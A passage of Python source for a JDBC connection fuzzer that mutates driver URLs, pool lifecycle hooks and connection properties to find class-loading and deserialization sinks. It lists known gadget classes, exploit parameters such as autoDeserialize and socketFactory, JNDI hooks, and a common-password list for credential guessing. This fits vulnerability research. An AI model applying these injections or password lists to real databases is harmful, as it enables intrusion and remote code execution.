    def get_all_implementations(self) -> list[str]:
        """Return all interface implementation classes (flat list, deduplicated)."""
        result = set()
        for impls in self.interface_impls.values():
            result.update(impls)
        return list(result)


# ---------------------------------------------------------------------------
# Affinity database — runtime learning of (driver, property, class) coverage
# ---------------------------------------------------------------------------

class _AffinityDB:
    """Tracks which (driver, property, class) combinations yield coverage/sinks.

    Built up incrementally from engine feedback. Guides the 3-tier class
    selection in C11 _classpath_probe.
    """

    _MAX_CLASSES_PER_PROP = 500
    _MAX_SINK_ENTRIES = 5000

    def __init__(self) -> None:
        # (driver, prop) → {classes that triggered class_load}
        self._class_loading_props: dict[tuple[str, str], set[str]] = {}
        # driver → {props confirmed to accept class names}
        self._confirmed_class_props: dict[str, set[str]] = {}
        # (driver, prop, class) → {sinks hit}
        self._sink_map: dict[tuple[str, str, str], set[str]] = {}
        # Property discovery: track which (driver, prop) pairs have been probed
        self._probed_props: set[tuple[str, str]] = set()
        # driver → {props confirmed NOT to accept class names (probed, no hit)}
        self._rejected_class_props: dict[str, set[str]] = {}

    def record_class_load(self, driver: str, prop: str, class_name: str) -> None:
        key = (driver, prop)
        if key not in self._class_loading_props:
            self._class_loading_props[key] = set()
        s = self._class_loading_props[key]
        if len(s) < self._MAX_CLASSES_PER_PROP:
            s.add(class_name)
        # Confirm this prop accepts class names
        self._confirmed_class_props.setdefault(driver, set()).add(prop)

    def record_sink(self, driver: str, prop: str, class_name: str, sink: str) -> None:
        if len(self._sink_map) >= self._MAX_SINK_ENTRIES:
            return
        key = (driver, prop, class_name)
        self._sink_map.setdefault(key, set()).add(sink)

    def get_class_loading_properties(self, driver: str) -> list[str]:
        """Return properties confirmed to trigger class loading for *driver*."""
        return list(self._confirmed_class_props.get(driver, set()))

    def get_successful_packages(self, driver: str, prop: str) -> list[str]:
        """Return package prefixes of classes that were successfully loaded."""
        classes = self._class_loading_props.get((driver, prop), set())
        pkgs: set[str] = set()
        for cls in classes:
            dot = cls.rfind(".")
            if dot > 0:
                pkgs.add(cls[:dot])
        return list(pkgs)

    def get_sink_classes(self, driver: str, prop: str) -> list[str]:
        """Return classes that reached a sink for (driver, prop)."""
        result = []
        for (d, p, c), sinks in self._sink_map.items():
            if d == driver and p == prop and sinks:
                result.append(c)
        return result

    # --- Property discovery ---

    def mark_probed(self, driver: str, prop: str) -> None:
        """Mark a (driver, prop) as having been probed with a canary."""
        self._probed_props.add((driver, prop))

    def mark_rejected(self, driver: str, prop: str) -> None:
        """Mark a property as NOT accepting class names (probed N times, no hit)."""
        self._rejected_class_props.setdefault(driver, set()).add(prop)

    def is_probed(self, driver: str, prop: str) -> bool:
        return (driver, prop) in self._probed_props

    def is_confirmed_class_prop(self, driver: str, prop: str) -> bool:
        return prop in self._confirmed_class_props.get(driver, set())

    def is_rejected(self, driver: str, prop: str) -> bool:
        return prop in self._rejected_class_props.get(driver, set())

    def get_unprobed_properties(
        self, driver: str,
        introspection_db: "_IntrospectionDB | None" = None,
        include_introspected: bool = True,
    ) -> list[str]:
        """Return property keys not yet probed for this driver.

        Merges hardcoded exploit_params with auto-introspected properties.
        Only includes introspected properties that look like class-loading
        candidates (keyword filter) to avoid probing 'host', 'port', etc.

        When include_introspected=False (Phase 1), only uses DRIVER_DATABASE.
        """
        info = DRIVER_DATABASE.get(driver, {})
        all_props = set(info.get("exploit_params", {}).keys())
        # Merge in introspected class-loading candidates (filtered, not all)
        if include_introspected and introspection_db and introspection_db._loaded:
            all_props.update(introspection_db.get_class_loading_candidates(driver))
        return [p for p in all_props
                if not self.is_probed(driver, p)
                and not self.is_confirmed_class_prop(driver, p)]


# ---------------------------------------------------------------------------
# Canary classes for initial classpath probing
# ---------------------------------------------------------------------------

_CANARY_CLASSES = [
    "groovy.lang.GroovyShell",         # dangerous clinit
    "bsh.Interpreter",                  # dangerous clinit
    "com.sun.rowset.JdbcRowSetImpl",    # JDK built-in, JNDI in init
    "javax.el.ELProcessor",            # EL injection
    "org.yaml.snakeyaml.Yaml",         # deser gadget
    "org.h2.Driver",                   # self-reference (benign, control)
    "org.hsqldb.jdbc.JDBCDriver",      # self-reference
    "org.postgresql.Driver",           # self-reference
    "com.mysql.cj.jdbc.Driver",        # self-reference
    "java.lang.Runtime",               # JDK core
    "org.springframework.context.support.ClassPathXmlApplicationContext",
    "org.apache.xbean.propertyeditor.JndiConverter",
    "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase",
    "org.apache.commons.beanutils.BeanComparator",
    "org.apache.commons.collections.functors.InvokerTransformer",
]

# ---------------------------------------------------------------------------
# Strategy weights
# ---------------------------------------------------------------------------

_STRATEGY_DEFS: list[tuple[str, float]] = [
    ("driver_swap",           0.08),
    ("url_param_inject",      0.13),
    ("pool_config_mutate",    0.12),
    ("sql_payload_mutate",    0.12),
    ("credential_mutate",     0.06),
    ("url_encoding_trick",    0.06),
    ("cross_driver_polyglot", 0.08),
    ("deser_property_inject", 0.09),
    ("consistency_fix",       0.05),
    ("exception_guided",      0.06),
    ("classpath_probe",       0.10),
    ("discovery_probe",       0.05),  # Level 1: auto-discover class-loading props
]

# ---------------------------------------------------------------------------
# Minimal valid IR
# ---------------------------------------------------------------------------

_MINIMAL_IR: dict[str, Any] = {
    "attack_type": "jdbc_connection",
    "driver": "h2",
    "driver_class": "org.h2.Driver",
    "jdbc_url": "jdbc:h2:mem:test",
    "url_params": {},
    "credentials": {"user": "sa", "password": ""},
    "pool": "",
    "pool_config": {},
    "sql_payload": "",
    "deser_properties": {},
}


def _parse_ir(data: bytes) -> dict[str, Any] | None:
    """Parse IR JSON with validation."""
    try:
        obj = json.loads(data)
        if isinstance(obj, dict) and obj.get("attack_type") == "jdbc_connection":
            return obj
    except (json.JSONDecodeError, UnicodeDecodeError, ValueError, RecursionError):
        pass
    return None


def _serialize_ir(ir: dict[str, Any]) -> bytes:
    """JSON serialize IR to bytes."""
    return json.dumps(ir, separators=(",", ":"), ensure_ascii=True).encode("utf-8")


def _normalize_ir(ir: dict[str, Any]) -> dict[str, Any]:
    """Ensure all required fields present with defaults."""
    ir.setdefault("attack_type", "jdbc_connection")
    ir.setdefault("driver", "h2")
    ir.setdefault("driver_class", "org.h2.Driver")
    ir.setdefault("jdbc_url", "jdbc:h2:mem:test")
    ir.setdefault("url_params", {})
    ir.setdefault("credentials", {"user": "sa", "password": ""})
    ir.setdefault("pool", "")
    ir.setdefault("pool_config", {})
    ir.setdefault("sql_payload", "")
    ir.setdefault("deser_properties", {})

    if not isinstance(ir["url_params"], dict):
        ir["url_params"] = {}
    if not isinstance(ir["credentials"], dict):
        ir["credentials"] = {"user": "sa", "password": ""}
    if not isinstance(ir["pool_config"], dict):
        ir["pool_config"] = {}
    if not isinstance(ir["deser_properties"], dict):
        ir["deser_properties"] = {}

    return ir


class JdbcMutator:
    """JDBC connection-level mutator for differential fuzzing of JDBC drivers.

    Targets the attack surface exposed by JDBC connection URLs, connection pool
    lifecycle hooks, and driver-specific configuration properties.  Each driver
    in ``DRIVER_DATABASE`` has its own set of exploitation parameters, SQL
    payloads, deserialization triggers, and default credentials.

    The mutator operates on a JSON intermediate representation (IR) that
    captures the full connection configuration:

    .. code-block:: json

        {
            "attack_type": "jdbc_connection",
            "driver": "h2",
            "driver_class": "org.h2.Driver",
            "jdbc_url": "jdbc:h2:mem:test",
            "url_params": {"INIT": "RUNSCRIPT FROM '...'"},
            "credentials": {"user": "sa", "password": ""},
            "pool": "hikari",
            "pool_config": {"connectionInitSql": "..."},
            "sql_payload": "CREATE ALIAS ...",
            "deser_properties": {}
        }

    Ten mutation strategies are applied with adaptive weights that are
    updated via :meth:`feedback` based on coverage and finding signals.

    Strategy overview:

    * **C1 driver_swap** -- Switch to a different JDBC driver, updating
      driver class, URL base, and default credentials accordingly.
    * **C2 url_param_inject** -- Inject 1-3 driver-specific exploitation
      parameters (e.g. H2 ``INIT``, MySQL ``autoDeserialize``).
    * **C3 pool_config_mutate** -- Configure a connection pool with
      lifecycle hooks that execute SQL on connection init/validation.
    * **C4 sql_payload_mutate** -- Select SQL payloads appropriate for
      the current driver (RCE, file read/write, time-based).
    * **C5 credential_mutate** -- Try default, empty, null, swapped,
      and proxy-user credential combinations.
    * **C6 url_encoding_trick** -- Apply URL encoding variations to
      parameter values (percent, double, unicode, case, backslash).
    * **C7 cross_driver_polyglot** -- Apply parameters from one driver
      to another driver's URL base to test cross-driver handling.
    * **C8 deser_property_inject** -- Inject known deserialization-
      triggering connection properties (MySQL autoDeserialize,
      PostgreSQL socketFactory, C3P0 userOverridesAsString).
    * **C9 consistency_fix** -- Repair mismatches between driver name,
      driver class, URL parameters, and pool configuration.
    * **C10 exception_guided** -- Use exception hints from the last
      execution to apply targeted corrections.
    * **C11 classpath_probe** -- Probe (property, class) combinations
      using 3-tier selection to discover class-loading sinks.
    * **C12 discovery_probe** -- Level 1 auto-discovery: systematically
      inject canaries into ALL properties to discover which accept
      class names, without hardcoding this knowledge.
    """

    name = "jdbc"

    def __init__(self, seed: int | None = None) -> None:
        self.rng = random.Random(seed)

        self._strategy_names: list[str] = [name for name, _ in _STRATEGY_DEFS]
        self._strategy_methods = [
            getattr(self, f"_{name}") for name, _ in _STRATEGY_DEFS
        ]
        self._base_weights: list[int] = [
            max(1, int(w * 100)) for _, w in _STRATEGY_DEFS
        ]
        self._weights: list[int] = list(self._base_weights)
        self._strategy_finds: list[int] = [0] * len(self._strategy_methods)
        self._strategy_cov: list[int] = [0] * len(self._strategy_methods)
        self._total_feedback_calls: int = 0
        self._last_exception_hint: dict[str, Any] | None = None

        # Discovery components (Steps 3-6 of generalization plan)
        self._classpath_catalog = _ClasspathCatalog()
        self._affinity_db = _AffinityDB()
        self._introspection_db = _IntrospectionDB()
        self._probe_iteration_count: int = 0
        self._last_driver: str | None = None
        # C12 discovery_probe: (driver, prop) → probe count
        self._discovery_probe_counts: dict[tuple[str, str], int] = {}
        # Build merged canary list with PRIORITY ORDERING:
        # First N = hardcoded canaries (highest value, always cycled first)
        # Then interface impls, then clinit sample.
        self._merged_canaries = list(_CANARY_CLASSES)  # indices 0..14
        self._canary_priority_boundary = len(self._merged_canaries)
        if self._introspection_db._loaded:
            for cls in self._introspection_db.get_all_implementations():
                if cls not in self._merged_canaries:
                    self._merged_canaries.append(cls)
            added = 0
            for cls in self._introspection_db.clinit_candidates:
                if added >= 30:
                    break
                if cls not in self._merged_canaries:
                    self._merged_canaries.append(cls)
                    added += 1
        # Track C12 completion for adaptive weight decay
        self._discovery_complete = False
        self._discovery_phase2_complete = False
        # Hybrid mode: exploitation-first, then exploration
        # Phase 1 (iter < threshold): C12 uses only DRIVER_DATABASE props
        # Phase 2 (iter >= threshold): C12 adds introspected class-loading candidates
        self._total_mutate_calls: int = 0
        self._EXPLORATION_PHASE_ITER = 3000  # ~10min at 5-8 exec/s

    # ------------------------------------------------------------------
    # Mutator protocol
    # ------------------------------------------------------------------

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        """Parse IR, apply 1-3 weighted strategies, return new Input."""
        self._total_mutate_calls += 1
        ir = _parse_ir(inp.data)
        if ir is None:
            ir = copy.deepcopy(_MINIMAL_IR)

        applied: list[str] = []

        n_mutations = self.rng.choices([1, 2, 3], weights=[50, 35, 15], k=1)[0]
        for _ in range(n_mutations):
            idx = self.rng.choices(
                range(len(self._strategy_methods)),
                weights=self._weights,
                k=1,
            )[0]
            result = self._strategy_methods[idx](ir, corpus)
            if result is not None:
                out = _serialize_ir(result)
                if len(out) <= MAX_OUTPUT_SIZE:
                    ir = result
                    applied.append(self._strategy_names[idx])
                    continue

            # Fallback to a random strategy
            fallback_idx = self.rng.randrange(len(self._strategy_methods))
            result = self._strategy_methods[fallback_idx](ir, corpus)
            if result is not None:
                out = _serialize_ir(result)
                if len(out) <= MAX_OUTPUT_SIZE:
                    ir = result
                    applied.append(self._strategy_names[fallback_idx])

        _normalize_ir(ir)
        self._last_driver = ir.get("driver", "h2")

        # Adaptive C12 weight: decay as properties get probed
        self._update_discovery_weight()

        data = _serialize_ir(ir)
        return Input(
            data=data[:MAX_OUTPUT_SIZE],
            metadata={
                **inp.metadata,
                "mutator": self.name,
                "strategies": applied,
                "driver": ir.get("driver", ""),
                "pool": ir.get("pool", ""),
            },
        )

    # ------------------------------------------------------------------
    # Adaptive feedback
    # ------------------------------------------------------------------

    def feedback(self, strategy_name: str, signal: str) -> None:
        """Adjust strategy weights based on signal."""
        try:
            idx = self._strategy_names.index(strategy_name)
        except ValueError:
            return

        self._total_feedback_calls += 1

        if signal == "finding":
            self._strategy_finds[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] // 4, 1),
                self._base_weights[idx] * 3,
            )
        elif signal == "coverage":
            self._strategy_cov[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] // 10, 1),
                self._base_weights[idx] * 3,
            )
        elif signal == "stall":
            self._weights[idx] = max(
                self._weights[idx] - max(self._base_weights[idx] // 5, 1),
                1,
            )
        elif signal == "timeout":
            penalty = max(self._base_weights[idx] // 3, 1)
            if self._strategy_names[idx] == "exception_guided":
                penalty = max(self._base_weights[idx] // 2, 1)
            self._weights[idx] = max(self._weights[idx] - penalty, 1)

        # Periodic decay for unproductive strategies
        if self._total_feedback_calls % 1000 == 0:
            for i in range(len(self._strategy_methods)):
                if self._strategy_finds[i] == 0 and self._strategy_cov[i] == 0:
                    self._weights[i] = max(self._weights[i] - 1, 1)

    def reset_weights(self, boost_zero_finds: bool = False) -> None:
        """Reset to default weights, optionally boost unexplored strategies."""
        if boost_zero_finds:
            for i in range(len(self._strategy_methods)):
                if self._strategy_finds[i] == 0:
                    self._weights[i] = min(
                        self._base_weights[i] + max(self._base_weights[i] // 3, 1),
                        self._base_weights[i] * 2,
                    )
                else:
                    self._weights[i] = self._base_weights[i]
        else:
            self._weights = list(self._base_weights)

    def _update_discovery_weight(self) -> None:
        """Adaptively decay C12 weight as discovery completes.

        When all properties have been probed, transfers C12's budget to
        C11 (classpath_probe) and C2 (url_param_inject) for exploitation.
        """
        if "discovery_probe" not in self._strategy_names:
            return
        # Re-check: Phase 2 may unlock new properties to probe
        in_exploration = self._total_mutate_calls >= self._EXPLORATION_PHASE_ITER
        if self._discovery_complete and not in_exploration:
            return
        # Reset discovery_complete when entering Phase 2 (new props available)
        if self._discovery_complete and in_exploration and not self._discovery_phase2_complete:
            self._discovery_complete = False
        # Phase 2 already complete — no more work to do
        if self._discovery_phase2_complete:
            return

        c12_idx = self._strategy_names.index("discovery_probe")

        # Check if all drivers have been fully probed (in current phase)
        in_exploration = self._total_mutate_calls >= self._EXPLORATION_PHASE_ITER
        any_unprobed = False
        for d in self._DISCOVERY_DRIVERS:
            up = self._affinity_db.get_unprobed_properties(
                d, self._introspection_db, include_introspected=in_exploration)
            if up:
                any_unprobed = True
                break

        if not any_unprobed:
            # Discovery complete — transfer budget to exploitation strategies
            self._discovery_complete = True
            if in_exploration:
                self._discovery_phase2_complete = True
            old_weight = self._weights[c12_idx]
            self._weights[c12_idx] = 1  # minimum

            # Transfer to C11 (classpath_probe) and C2 (url_param_inject)
            bonus = old_weight // 2
            if "classpath_probe" in self._strategy_names:
                c11_idx = self._strategy_names.index("classpath_probe")
                self._weights[c11_idx] += bonus
            if "url_param_inject" in self._strategy_names:
                c2_idx = self._strategy_names.index("url_param_inject")
                self._weights[c2_idx] += bonus
            logger.info(
                "discovery_probe complete — transferred weight %d to C11/C2",
                old_weight,
            )

    def set_exception_hint(self, hint: dict[str, Any] | None) -> None:
        """Store exception info and route sink attribution to affinity DB."""
        self._last_exception_hint = hint
        if not hint:
            return

        # Prefer driver from hint (parsed from JdbcTarget output), fall back to last mutated
        driver = hint.get("driver") or self._last_driver or "h2"

        # Route class_load_trigger to affinity DB
        trigger = hint.get("class_load_trigger")
        if trigger and ":" in trigger:
            _, prop = trigger.split(":", 1)
            cnp = hint.get("class_name_properties", {})
            class_name = cnp.get(prop)
            if class_name:
                self._affinity_db.record_class_load(driver, prop, class_name)
                if self._affinity_db._confirmed_class_props.get(driver, set()) == {prop}:
                    logger.info(
                        "affinity: discovered class-loading property %s.%s",
                        driver, prop,
                    )

        # Route sink attribution to affinity DB
        attribution = hint.get("sink_attribution", {})
        if isinstance(attribution, dict):
            for sink, trigger_str in attribution.items():
                if isinstance(trigger_str, str) and ":" in trigger_str:
                    _, prop = trigger_str.split(":", 1)
                    cnp = hint.get("class_name_properties", {})
                    class_name = cnp.get(prop)
                    if class_name:
                        self._affinity_db.record_sink(driver, prop, class_name, sink)

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _get_ir(self, ir: dict[str, Any]) -> dict[str, Any]:
        """Deep-copy the IR for safe mutation."""
        return copy.deepcopy(ir)

    def _random_sql_for_driver(self, driver: str) -> str:
        """Pick a SQL payload appropriate for the given driver."""
        info = DRIVER_DATABASE.get(driver, {})
        payloads = info.get("sql_payloads", [])
        if payloads:
            return self.rng.choice(payloads)
        # Fall back to cross-driver pool
        return self.rng.choice(_CROSS_DRIVER_SQL)

    def _encode_value(self, value: str) -> str:
        """Apply a random URL encoding trick to a string value."""
        trick = self.rng.choice(_ENCODING_TRICKS)

        if trick == "percent":
            # Percent-encode a random character
            if not value:
                return value
            idx = self.rng.randrange(len(value))
            ch = value[idx]
            encoded = f"%{ord(ch):02X}"
            return value[:idx] + encoded + value[idx + 1:]

        elif trick == "double_percent":
            # Double percent-encode a random character
            if not value:
                return value
            idx = self.rng.randrange(len(value))
            ch = value[idx]
            encoded = f"%25{ord(ch):02X}"
            return value[:idx] + encoded + value[idx + 1:]

        elif trick == "unicode":
            # Unicode normalization variant
            replacements = {
                "a": "\u0061",  # same but via explicit codepoint
                "/": "\u2215",  # division slash
                ".": "\u2024",  # one dot leader
                ":": "\uff1a",  # fullwidth colon
                "=": "\uff1d",  # fullwidth equals
            }
            result = value
            for original, replacement in replacements.items():
                if original in result and self.rng.random() < 0.3:
                    result = result.replace(original, replacement, 1)
                    break
            return result

        elif trick == "case_variation":
            # Random case variation
            if not value:
                return value
            chars = list(value)
            idx = self.rng.randrange(len(chars))
            chars[idx] = chars[idx].swapcase()
            return "".join(chars)

        elif trick == "backslash":
            # Backslash substitution for forward slash
            return value.replace("/", "\\", 1) if "/" in value else value

        elif trick == "null_byte":
            # Inject null byte
            if not value:
                return value
            idx = self.rng.randrange(len(value) + 1)
            return value[:idx] + "\x00" + value[idx:]

        return value

    def _build_jdbc_url(self, driver: str, params: dict[str, str]) -> str:
        """Build a JDBC URL from driver info and parameters."""
        info = DRIVER_DATABASE.get(driver, {})
        base = self.rng.choice(info.get("url_base", ["jdbc:h2:mem:test"]))
        if not params:
            return base

        separator = info.get("url_separator", ";")
        prefix = info.get("url_prefix", "")

        param_str = separator.join(f"{k}={v}" for k, v in params.items())
        if prefix:
            return f"{base}{prefix}{param_str}"
        return f"{base}{separator}{param_str}"

    # ------------------------------------------------------------------
    # C1: Driver swap
    # ------------------------------------------------------------------

    def _driver_swap(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Pick a random driver, update class/URL/creds, clear incompatible params."""
        out = self._get_ir(ir)
        current = out.get("driver", "")
        candidates = [d for d in _DRIVER_NAMES if d != current]
        if not candidates:
            return None

        new_driver = self.rng.choice(candidates)
        info = DRIVER_DATABASE[new_driver]

        out["driver"] = new_driver
        out["driver_class"] = info["class"]
        out["jdbc_url"] = self.rng.choice(info["url_base"])
        out["credentials"] = copy.deepcopy(info["default_creds"])

        # Clear url_params that are incompatible with new driver
        old_params = out.get("url_params", {})
        new_exploit_params = info.get("exploit_params", {})
        compatible_params = {}
        for key, val in old_params.items():
            if key in new_exploit_params:
                compatible_params[key] = val
        out["url_params"] = compatible_params

        # Clear deser_properties if new driver has none
        if not info.get("deser_properties"):
            out["deser_properties"] = {}

        return out

    # ------------------------------------------------------------------
    # C2: URL parameter injection
    # ------------------------------------------------------------------

    def _url_param_inject(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Inject 1-3 driver-specific exploit params."""
        out = self._get_ir(ir)
        driver = out.get("driver", "h2")
        info = DRIVER_DATABASE.get(driver, {})
        exploit_params = info.get("exploit_params", {})

        if not exploit_params:
            # Try switching to a driver with exploit params
            drivers_with_params = [
                d for d, i in DRIVER_DATABASE.items()
                if i.get("exploit_params")
            ]
            if not drivers_with_params:
                return None
            driver = self.rng.choice(drivers_with_params)
            info = DRIVER_DATABASE[driver]
            exploit_params = info["exploit_params"]
            out["driver"] = driver
            out["driver_class"] = info["class"]
            out["jdbc_url"] = self.rng.choice(info["url_base"])

        params = out.setdefault("url_params", {})
        if not isinstance(params, dict):
            params = {}
            out["url_params"] = params

        n_params = self.rng.randint(1, min(3, len(exploit_params)))
        chosen_keys = self.rng.sample(list(exploit_params.keys()), n_params)

        action = self.rng.choices(
            ["add", "replace", "remove"],
            weights=[60, 30, 10],
            k=1,
        )[0]

        if action == "remove" and params:
            # Remove a random existing param
            key = self.rng.choice(list(params.keys()))
            del params[key]
        else:
            for key in chosen_keys:
                values = exploit_params[key]
                # Priority 1: affinity-discovered classes from sink hits
                affinity_classes = self._affinity_db.get_sink_classes(driver, key)
                if affinity_classes and self.rng.random() < 0.3:
                    params[key] = self.rng.choice(affinity_classes)
                # Priority 2: if C12 confirmed this is a class-loading prop
                # but values list is empty (stripped), use canary/catalog
                elif not values and self._affinity_db.is_confirmed_class_prop(driver, key):
                    params[key] = self._pick_probe_class(driver, key)
                elif values:
                    params[key] = self.rng.choice(values)
                # else: empty and unconfirmed — skip

        return out

    # ------------------------------------------------------------------
    # C3: Pool config mutation
    # ------------------------------------------------------------------

    def _pool_config_mutate(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Pick a pool, set lifecycle hooks with SQL payloads."""
        out = self._get_ir(ir)
        pool_name = self.rng.choice(_POOL_NAMES)
        pool_info = POOL_DATABASE[pool_name]

        out["pool"] = pool_name

        # Pick a lifecycle hook and fill with SQL
        hooks = pool_info.get("lifecycle_hooks", {})
        if not hooks:
            return out

        driver = out.get("driver", "h2")
        hook_name = self.rng.choice(list(hooks.keys()))
        hook_type = hooks[hook_name]

        pool_config = out.setdefault("pool_config", {})
        if not isinstance(pool_config, dict):
            pool_config = {}
            out["pool_config"] = pool_config

        # Check if pool has extra_attack_properties for this hook
        extra_props = pool_info.get("extra_attack_properties", {})
        extra_values = extra_props.get(hook_name)

        if hook_type == "jndi" and extra_values:
            # JNDI hooks get JNDI URIs, not SQL
            pool_config[hook_name] = self.rng.choice(extra_values)
        elif extra_values and self.rng.random() < 0.4:
            # 40% chance: use pool-specific attack payload instead of SQL
            pool_config[hook_name] = self.rng.choice(extra_values)
        else:
            sql = self._random_sql_for_driver(driver)
            if hook_type == "list":
                pool_config[hook_name] = [sql]
            elif hook_type == "hex_serialized":
                hex_payload = hashlib.md5(sql.encode()).hexdigest()
                pool_config[hook_name] = hex_payload
            else:
                pool_config[hook_name] = sql

        # Optionally inject additional extra_attack_properties (non-hook keys)
        if extra_props and self.rng.random() < 0.3:
            other_keys = [k for k in extra_props if k != hook_name]
            if other_keys:
                extra_key = self.rng.choice(other_keys)
                pool_config[extra_key] = self.rng.choice(extra_props[extra_key])

        # Optionally add pool config keys
        config_keys = pool_info.get("config_keys", [])
        if config_keys and self.rng.random() < 0.5:
            key = self.rng.choice(config_keys)
            pool_config[key] = str(self.rng.randint(1, 100))

        # Set factory class
        pool_config["factory_class"] = pool_info["factory_class"]

        return out

    # ------------------------------------------------------------------
    # C4: SQL payload mutation
    # ------------------------------------------------------------------

    def _sql_payload_mutate(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Pick a SQL payload from current driver or cross-driver pool."""
        out = self._get_ir(ir)
        driver = out.get("driver", "h2")
        info = DRIVER_DATABASE.get(driver, {})
        payloads = info.get("sql_payloads", [])

        if not payloads:
            # Swap to a driver that has SQL payloads
            drivers_with_sql = [
                d for d, i in DRIVER_DATABASE.items()
                if i.get("sql_payloads")
            ]
            if drivers_with_sql:
                new_driver = self.rng.choice(drivers_with_sql)
                new_info = DRIVER_DATABASE[new_driver]
                payloads = new_info["sql_payloads"]
                out["driver"] = new_driver
                out["driver_class"] = new_info["class"]
                out["jdbc_url"] = self.rng.choice(new_info["url_base"])
                out["credentials"] = copy.deepcopy(new_info["default_creds"])
            else:
                payloads = _CROSS_DRIVER_SQL

        # Choose payload from driver-specific or cross-driver pool
        if self.rng.random() < 0.8 and payloads:
            out["sql_payload"] = self.rng.choice(payloads)
        else:
            out["sql_payload"] = self.rng.choice(_CROSS_DRIVER_SQL)

        return out

    # ------------------------------------------------------------------
    # C5: Credential mutation
    # ------------------------------------------------------------------

    def _credential_mutate(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Mutate credentials: empty, null, swap, proxy user."""
        out = self._get_ir(ir)
        creds = out.setdefault("credentials", {})
        if not isinstance(creds, dict):
            creds = {"user": "sa", "password": ""}
            out["credentials"] = creds

        action = self.rng.choice([
            "empty_password",
            "null_password",
            "empty_user",
            "swap_user_password",
            "proxy_user",
            "empty_credentials",
            "default_creds",
            "common_password",
        ])

        if action == "empty_password":
            creds["password"] = ""
        elif action == "null_password":
            creds["password"] = None  # type: ignore[assignment]
        elif action == "empty_user":
            creds["user"] = ""
        elif action == "swap_user_password":
            user = creds.get("user", "")
            password = creds.get("password", "")
            creds["user"] = password
            creds["password"] = user
        elif action == "proxy_user":
            creds["proxyUser"] = self.rng.choice([
                "admin", "root", "sa", "system", "dba",
            ])
        elif action == "empty_credentials":
            out["credentials"] = {"user": "", "password": ""}
        elif action == "default_creds":
            driver = out.get("driver", "h2")
            info = DRIVER_DATABASE.get(driver, {})
            out["credentials"] = copy.deepcopy(
                info.get("default_creds", {"user": "sa", "password": ""})
            )
        elif action == "common_password":
            creds["password"] = self.rng.choice([
                "password", "admin", "root", "test", "123456",
                "Password1", "oracle", "manager", "changeit",
            ])

        return out

    # ------------------------------------------------------------------
    # C6: URL encoding trick
    # ------------------------------------------------------------------

    def _url_encoding_trick(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Apply encoding tricks to url_params values."""
        out = self._get_ir(ir)
        params = out.get("url_params", {})

        if not params:
            # Inject a param first, then encode it
            driver = out.get("driver", "h2")
            info = DRIVER_DATABASE.get(driver, {})
            exploit_params = info.get("exploit_params", {})
            # Filter to params with non-empty value lists
            non_empty = {k: v for k, v in exploit_params.items() if v}
            if non_empty:
                key = self.rng.choice(list(non_empty.keys()))
                params[key] = self.rng.choice(non_empty[key])
                out["url_params"] = params
            else:
                return None

        # Pick a random param value and encode it
        key = self.rng.choice(list(params.keys()))
        value = params[key]
        if isinstance(value, str) and value:
            params[key] = self._encode_value(value)

        return out

    # ------------------------------------------------------------------
    # C7: Cross-driver polyglot
    # ------------------------------------------------------------------

    def _cross_driver_polyglot(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Take generic params from one driver and apply to another's URL base.

        Only transfers params that are plausibly cross-driver (e.g. SSL,
        logging, mode).  Driver-specific class-loading params are NOT
        transferred because they reference interfaces that only exist in
        the source driver's JAR.
        """
        # Params that only make sense for their specific driver
        _DRIVER_SPECIFIC_PARAMS = {
            # H2-only (org.h2.api.* interfaces)
            "DATABASE_EVENT_LISTENER", "JAVA_OBJECT_SERIALIZER", "AUTHENTICATOR",
            "PASSWORD_HASH", "CIPHER", "RECOVER_TEST", "AUTO_SERVER", "AUTO_SERVER_PORT",
            "INIT", "ALLOW_LITERALS", "IGNORE_UNKNOWN_SETTINGS", "MODE",
            # HSQLDB-only
            "shutdown", "ifexists", "textdb.allow_full_path", "check_props",
            # MySQL-only (com.mysql.cj.* interfaces)
            "connectionLifecycleInterceptors", "exceptionInterceptors",
            "propertiesTransform", "clientInfoProvider", "authenticationPlugins",
            "defaultAuthenticationPlugin", "autoDeserialize", "queryInterceptors",
            "allowLoadLocalInfile", "allowUrlInLocalInfile", "allowLoadLocalInfileInPath",
            "detectCustomCollations", "sessionVariables",
            "serverRSAPublicKeyFile", "ociConfigFile", "allowPublicKeyRetrieval",
            "keyManagerFactoryProvider", "trustManagerFactoryProvider", "sslContextProvider",
            # PgSQL-only (org.postgresql.* interfaces)
            "socketFactory", "socketFactoryArg", "sslfactory", "sslfactoryarg",
            "authenticationPluginClassName", "sslhostnameverifier", "sslpasswordcallback",
            "xmlFactoryFactory", "options",
            # SQLServer-only
            "authenticationScheme", "domain", "xopenStates",
            # Oracle-only
            "oracle.net.customTrustStore", "oracle.net.ssl_server_dn_match",
            "oracle.net.ssl_certificate_alias", "oracle.net.wallet_location",
            "oracle.net.tns_admin", "oracle.net.authentication_services",
            "oracle.jdbc.proxyClientName", "oracle.jdbc.oracleDriver",
            "oracle.net.customLogger", "oracle.jdbc.Trace",
            "oracle.net.log_volume", "oracle.net.trace_directory_client",
            "oracle.net.trace_file_client", "oracle.net.trace_level_client",
        }

        out = self._get_ir(ir)
        current_driver = out.get("driver", "h2")

        # Pick a source driver different from current
        source_candidates = [d for d in _DRIVER_NAMES if d != current_driver]
        if not source_candidates:
            return None
        source_driver = self.rng.choice(source_candidates)
        source_info = DRIVER_DATABASE[source_driver]

        # Pick a target driver different from source
        target_candidates = [d for d in _DRIVER_NAMES if d != source_driver]
        if not target_candidates:
            return None
        target_driver = self.rng.choice(target_candidates)
        target_info = DRIVER_DATABASE[target_driver]

        out["driver"] = target_driver
        out["driver_class"] = target_info["class"]
        out["jdbc_url"] = self.rng.choice(target_info["url_base"])
